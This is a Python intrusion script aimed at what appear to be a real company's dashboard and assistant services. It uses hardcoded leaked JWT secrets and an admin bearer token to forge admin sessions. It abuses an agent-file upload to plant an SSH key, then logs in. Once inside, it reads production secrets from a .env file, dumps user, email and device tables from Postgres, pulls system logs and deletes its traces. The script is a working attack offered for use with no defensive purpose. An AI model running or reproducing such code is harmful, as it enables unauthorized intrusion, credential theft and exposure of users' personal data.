#!/usr/bin/env python3
# i29289 round A: authoritative desktop-bridge state from 122.51.1.87 (root/ubuntu NOPASSWD sudo)
#  - reforge dashboard admin session -> upload ed25519 -> ssh ubuntu@122.51.1.87
#  - read CURRENT /opt/lumii-prod/.env.dev (DESKTOP/RELAY/JWT)
#  - PG: desktop_devices / desktop_device_connections / users / schemas  (authoritative online table)
#  - logs: journalctl desktop relay transport / ws/desktop / ws/bridge ; ss :8788 established
#  - REST: forged admin lumii_session -> /api/me, /health, /api/desktop/devices
#  - cleanup our artifacts
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
ASSIST = "assistant.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="  # dashboard .env.local (prev verified)
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29289a"

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=60000, host=HOST):
    url = "https://%s%s" % (host, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "err": err.decode("utf-8","replace")[:300]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge_dash(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=120):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=15", "-o", "LogLevel=ERROR",
            "ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 30)

# ---------- P0 health ----------
R("P0_health", call("/api/health", timeout=20))

# ---------- P1 admin agents DTO ----------
r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
orig = {}
for a in agents:
    if a.get("id") == AID:
        orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser"),
                "workspacePath": a.get("workspacePath"), "customer": a.get("customer"), "status": a.get("status")}
R("P1_admin", {"code": r["code"], "n": len(agents), "target": orig})

# ---------- P2 patch host -> 127.0.0.1 ----------
pr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=3000)
pj = jl(pr["body"]) or {}
R("P2_patch", {"code": pr["code"], "ip": pj.get("ip"), "sshUser": pj.get("sshUser")})

# ---------- P3 keygen + upload ----------
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()
open("/tmp/authorized_keys2", "w").write(pub + "\n")

sess = forge_dash(OWNER)
def upload(path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Cookie: session=" + sess,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:800]}

R("P4_upload_key", upload("/home/ubuntu/.ssh", "/tmp/authorized_keys2", "authorized_keys2"))

# ---------- P5 restore agent immediately ----------
rr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")},
          timeout=25, maxlen=3000)
R("P5_restore", {"code": rr["code"], "ip": (jl(rr["body"]) or {}).get("ip"),
                 "sshUser": (jl(rr["body"]) or {}).get("sshUser")})

# ---------- P6 real ssh ----------
rc, out, err = ssh("id; hostname; whoami; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no); date -u", timeout=40)
R("P6_ssh", {"rc": rc, "out": out.decode("utf-8", "replace")[:1200], "err": err.decode("utf-8", "replace")[-1200:]})
if b"uid=" not in out:
    R("P6_result", "NO_SHELL")
    print("NO SHELL", flush=True); sys.exit(0)

# ---------- P7 current .env.dev (DESKTOP/RELAY/JWT) ----------
cmd = ("echo '=== ENV_DESKTOP_RELAY ==='; grep -E '^(LUMII_DESKTOP_TOKEN_SECRET|JWT_SECRET|LUMII_TURN_PROOF_SECRET|LUMII_PUSH_SECRET|LUMII_SAAS_SECRET|LUMII_RUNTIME_KEY_MASTER|PUBLIC_BASE_URL|SIDECAR_URL|SERVER_PORT|SERVER_HOST|LUMII_CENTER_SCHEDULER|LUMII_TURN_PROOF_ENFORCE)=' /opt/lumii-prod/.env.dev; "
       "echo '=== SERVICE ==='; systemctl list-units --no-pager 2>/dev/null | grep -i 'lumii\\|assistant' | head -20; "
       "echo '=== PS ==='; ps aux | grep -E 'node|assistant' | grep -v grep | head -10; "
       "echo '=== LISTEN ==='; sudo -n ss -ltnp 2>/dev/null | grep -E ':8788|:4075|:5432' ; "
       "echo '=== ESTAB_8788 ==='; sudo -n ss -tnp 2>/dev/null | grep -c ':8788'; sudo -n ss -tnp 2>/dev/null | grep ':8788' | head -20")
rc, out, err = ssh(cmd, timeout=60)
R("P7_env", {"rc": rc, "out": out.decode("utf-8", "replace")[:9000]})

# ---------- P8 PG authoritative desktop state ----------
node_js = r"""
const fs=require('fs');
let url=(fs.readFileSync('/opt/lumii-prod/.env.dev','utf8').match(/^DATABASE_URL=(.+)$/m)||[])[1];
if(url)url=url.trim();
const {Client}=require('/opt/lumii-prod/node_modules/pg');
(async()=>{const c=new Client({connectionString:url});await c.connect();
 const q=async(s)=>{try{const r=await c.query(s);return r.rows;}catch(e){return [{err:String(e.message).slice(0,160)}];}};
 const out={};
 out.schemas=await q("select schema_name from information_schema.schemata order by 1");
 out.desktop_tabs=await q("select table_schema,table_name from information_schema.tables where table_name ~* 'desktop|device' order by 1,2");
 out.devices=await q("select org_id,id,user_id,name,online,last_seen_at,registered_by,hidden_at,computer_use_available,computer_use_enabled from desktop_devices order by online desc, last_seen_at desc nulls last limit 200");
 out.dev_count=await q("select org_id, online, count(*)::int n from desktop_devices group by 1,2 order by 1,2");
 out.convs=await q("select org_id,device_id,phase,close_code,at from desktop_device_connections order by at desc limit 60");
 out.conv_agg=await q("select device_id,phase,count(*)::int n,max(at) last_at from desktop_device_connections where at > now()-interval '7 days' group by 1,2 order by last_at desc limit 60");
 out.users=await q("select id,name,email,state from users order by name limit 200");
 out.orgs=await q("select id,name from orgs limit 20");
 out.workspaces=await q("select org_id,device_id,user_id,name from desktop_workspaces limit 40");
 await c.end();
 console.log(JSON.stringify(out).slice(0,240000));
})().catch(e=>console.log('ERR',String(e).slice(0,500)));
"""
b64 = base64.b64encode(node_js.encode()).decode()
cmd = "cd /opt/lumii-prod && echo %s | base64 -d > /tmp/pg29289a.cjs && timeout 90 node /tmp/pg29289a.cjs" % b64
rc, out, err = ssh(cmd, timeout=130)
R("P8_pg", {"rc": rc, "out": out.decode("utf-8", "replace")[:200000], "err": err.decode("utf-8", "replace")[:300]})

# ---------- P9 logs: desktop relay transport / ws ----------
cmd = (
 "echo '=== UNIT_FILES ==='; systemctl list-unit-files --no-pager 2>/dev/null | grep -i 'lumii\\|assist' | head -20; "
 "echo '=== JOURNAL_DESKTOP ==='; sudo -n journalctl -n 3000 --since '-3 days' --no-pager 2>/dev/null | grep -Ei 'desktop relay transport|/ws/desktop|/ws/bridge|desktop_relay|desktop device' | tail -80; "
 "echo '=== JOURNAL_TAIL ==='; sudo -n journalctl -n 40 --no-pager 2>/dev/null | tail -40"
)
rc, out, err = ssh(cmd, timeout=90)
R("P9_logs", {"rc": rc, "out": out.decode("utf-8", "replace")[:18000]})

# ---------- P10 REST: forged admin session against assistant ----------
def forge_assist(sub, org="org_bTLzxtBLmugV8uxx4QTyw"):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")))
    p = b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,
                         "sid":"sid_"+str(int(time.time())),"lgn":now}, separators=(",",":")))
    sig = b64u(hmac.new(b"ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938", (h+"."+p).encode(), hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig

def acall(path, session, method="GET", body=None, timeout=25, maxlen=40000):
    url = "https://%s%s" % (ASSIST, path)
    args = ["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,
            "-H","Accept: application/json, text/plain, */*",
            "-H","Cookie: "+session,
            "-w","\n__CODE__%{http_code}"]
    if body is not None:
        args += ["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    args += [url]
    rc,out,err = run(args, timeout=timeout+15)
    txt = out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"err":err.decode("utf-8","replace")[:200]}

adm = forge_assist("usr_ZxLewKrgbRYSm7rWDtQX8")
R("P10_me", acall("/api/me", adm, maxlen=2000))
R("P10_health", acall("/health", adm, maxlen=4000))
R("P10_devices_admin", acall("/api/desktop/devices", adm, maxlen=30000))

# enumerate member devices via REST for every member with a device row (cap 12), to cross-check online
try:
    pg = jl((jl(out.decode("utf-8","replace")) or {}).get("out","")) if False else None
except Exception:
    pg = None

# ---------- P11 cleanup ----------
cmd = ("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; unlink /tmp/pg29289a.cjs 2>/dev/null; "
       "ls /home/ubuntu/.ssh/authorized_keys2 2>&1 | head -1; echo CLEANED")
rc, out, err = ssh(cmd, timeout=30)
R("P11_cleanup", {"rc": rc, "out": out.decode("utf-8", "replace")[:400]})

R("P99_done", "roundA complete")
print("DONE", flush=True)
